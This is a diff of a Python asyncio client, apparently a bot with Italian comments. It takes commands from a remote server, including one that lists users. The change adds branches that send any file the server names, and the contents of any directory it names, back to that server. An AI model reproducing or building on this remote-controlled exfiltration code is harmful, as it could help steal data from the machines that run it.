@@ -42,11 +42,6 @@ async def command_to_execute(writer: asyncio.StreamWriter, case: str) -> None:
         case 'USERS':
             await bot_utils.get_users(writer)
 
-        case 'DOWNLOAD-FILE':
-            # TODO: Spostare la funzione a parte e gestire la richiesta del file con un dictionary una volta listato il contenuto (?)
-            request = "test.png"  # Atm il file è hardcoded -> In questo punto facciamo stripping della request ricevuta dal server e controlliamo se esiste sul disco il file richiesto
-            await bot_utils.send_file(request, __buffer_size, writer)  # Spostiamo la gestione del controllo di esistenza del file all'interno della funzione stessa
-
         case _:
             return "NULL"
 
@@ -77,10 +72,17 @@ async def run_client(hostname: str, port: int) -> None:
                 await command_to_execute(writer, response.decode())
                 await asyncio.sleep(1)
                 writer.write(operation_keyword.encode())
-        elif response.decode().startswith(__response_options["10"]):
-            request = re.split(__response_options["10"], response.decode())[1]
-            await bot_utils.send_dir_content(request, os_type, writer)
+
+        elif response.decode().startswith(__response_options["8"]):
+            request = re.split(__response_options["8"], response.decode())[1]  # -> In questo punto facciamo stripping della request ricevuta dal server e controlliamo se esiste sul disco il file richiesto
+            print(request)
+            await bot_utils.send_file(request, __buffer_size, writer)  # Spostiamo la gestione del controllo di esistenza del file all'interno della funzione stessa
             writer.write(operation_keyword.encode())
+
+        elif response.decode().startswith(__response_options["9"]):
+            request = re.split(__response_options["9"], response.decode())[1]
+            await bot_utils.send_dir_content(request, os_type, writer)
+            # writer.write(operation_keyword.encode())
         else:  # In caso contrario chiediamo al server di inviare una nuova risposta valida
             writer.write(operation_keyword.encode())
 
